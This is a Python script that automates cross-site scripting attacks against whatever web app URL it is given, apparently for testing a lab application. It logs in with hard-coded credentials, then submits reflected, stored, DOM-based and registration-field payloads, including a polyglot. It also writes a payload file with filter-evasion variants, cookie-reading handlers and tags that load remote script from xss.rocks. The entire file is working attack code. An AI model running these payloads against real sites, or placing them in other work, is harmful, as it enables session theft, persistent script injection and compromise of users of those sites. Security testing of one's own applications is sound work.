#!/usr/bin/env python3

import requests
import sys
import time

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def login_as_user(self):
        data = {
            'username': 'user',
            'password': 'user123'
        }
        response = self.session.post(f"{self.target_url}/login", data=data)
        return "dashboard" in response.text.lower()
    
    def test_reflected_xss_search(self):
        print("[+] Testing Reflected XSS in search functionality...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus><option>XSS</option></select>",
            "<textarea onfocus=alert('XSS') autofocus>XSS</textarea>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>XSS</marquee>"
        ]
        
        for payload in xss_payloads:
            params = {'q': payload}
            response = self.session.get(f"{self.target_url}/search", params=params)
            
            if payload in response.text and "script" not in response.text.lower().replace(payload.lower(), ""):
                print(f"[SUCCESS] Reflected XSS found: {payload}")
            else:
                print(f"[INFO] Testing payload: {payload[:50]}...")
    
    def test_stored_xss_comments(self):
        print("[+] Testing Stored XSS in comment functionality...")
        
        if not self.login_as_user():
            print("[ERROR] Could not login as user")
            return
        
        stored_xss_payloads = [
            "<script>alert('Stored XSS')</script>",
            "<img src=x onerror=alert('Stored XSS')>",
            "<svg onload=alert('Stored XSS')>",
            "<iframe src=javascript:alert('Stored XSS')></iframe>",
            "<body onload=alert('Stored XSS')>",
            "<details open ontoggle=alert('Stored XSS')>",
            "<marquee onstart=alert('Stored XSS')>XSS</marquee>",
            "<video><source onerror=alert('Stored XSS')>",
            "<audio src=x onerror=alert('Stored XSS')>",
            "<object data=javascript:alert('Stored XSS')>",
            "<embed src=javascript:alert('Stored XSS')>",
            "<applet code=javascript:alert('Stored XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('Stored XSS')>",
            "<link rel=stylesheet href=javascript:alert('Stored XSS')>",
            "<style>@import'javascript:alert(\"Stored XSS\")';</style>"
        ]
        
        for i, payload in enumerate(stored_xss_payloads):
            comment_data = {
                'postId': '1',
                'comment': payload,
                'author': f'XSS_Tester_{i}'
            }
            
            response = self.session.post(f"{self.target_url}/comment", data=comment_data)
            
            if response.status_code == 302:
                print(f"[SUCCESS] Stored XSS payload submitted: {payload[:50]}...")
                
                check_response = self.session.get(f"{self.target_url}/post/1")
                if payload in check_response.text:
                    print(f"[CRITICAL] Stored XSS confirmed and persistent!")
            else:
                print(f"[INFO] Testing stored XSS payload: {payload[:50]}...")
    
    def test_dom_xss(self):
        print("[+] Testing DOM-based XSS...")
        
        dom_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#<img src=x onerror=alert('DOM XSS')>",
            "#javascript:alert('DOM XSS')",
            "#<svg onload=alert('DOM XSS')>",
            "#<iframe src=javascript:alert('DOM XSS')></iframe>"
        ]
        
        for payload in dom_payloads:
            full_url = f"{self.target_url}/{payload}"
            response = self.session.get(full_url)
            print(f"[INFO] Testing DOM XSS: {payload}")
    
    def generate_xss_polyglot(self):
        print("[+] Generating XSS polyglot payload...")
        
        polyglot = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
        
        print(f"[INFO] XSS Polyglot: {polyglot}")
        
        params = {'q': polyglot}
        response = self.session.get(f"{self.target_url}/search", params=params)
        
        if "svg" in response.text and "onload" in response.text:
            print("[SUCCESS] XSS Polyglot potentially successful!")
    
    def test_xss_in_user_registration(self):
        print("[+] Testing XSS in user registration...")
        
        xss_user_payloads = [
            "<script>alert('XSS in username')</script>",
            "<img src=x onerror=alert('XSS in email')>",
            "javascript:alert('XSS')"
        ]
        
        for i, payload in enumerate(xss_user_payloads):
            user_data = {
                'username': f"xss_user_{i}_{payload}",
                'password': 'test123',
                'email': f"xss_{i}@{payload}.com"
            }
            
            response = self.session.post(f"{self.target_url}/register", data=user_data)
            print(f"[INFO] Testing XSS in registration: {payload[:30]}...")
    
    def create_xss_payloads_file(self):
        print("[+] Creating comprehensive XSS payloads file...")
        
        comprehensive_payloads = [
            "<script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<img src=javascript:alert('XSS')>",
            "<img src=JaVaScRiPt:alert('XSS')>",
            "<img src=javascript:alert(&quot;XSS&quot;)>",
            "<img src=`javascript:alert(\"RSnake says, 'XSS'\")`>",
            "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
            "<a onmouseover=alert(document.cookie)>xxs link</a>",
            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=# onmouseover=\"alert('xxs')\">",
            "<IMG SRC= onmouseover=\"alert('xxs')\">",
            "<IMG onmouseover=\"alert('xxs')\">",
            "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
            "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
            "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
            "<IMG SRC=\"jav   ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out",
            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
            "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
            "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
            "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
            "<SCRIPT SRC=//xss.rocks/.j>",
            "<IMG SRC=\"javascript:alert('XSS')\"",
            "<iframe src=http://xss.rocks/scriptlet.html <",
            "\\\";alert('XSS');//"
        ]
        
        with open('xss_payloads.txt', 'w') as f:
            for payload in comprehensive_payloads:
                f.write(payload + '\n')
        
        print("[SUCCESS] XSS payloads saved to xss_payloads.txt")
    
    def run_all_tests(self):
        print("=" * 60)
        print("CROSS-SITE SCRIPTING (XSS) VULNERABILITY TESTING")
        print("=" * 60)
        
        self.test_reflected_xss_search()
        print()
        self.test_stored_xss_comments()
        print()
        self.test_dom_xss()
        print()
        self.generate_xss_polyglot()
        print()
        self.test_xss_in_user_registration()
        print()
        self.create_xss_payloads_file()
        
        print("\n[INFO] XSS testing completed!")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 xss_exploit.py <target_url>")
        print("Example: python3 xss_exploit.py http://localhost:3000")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = XSSExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()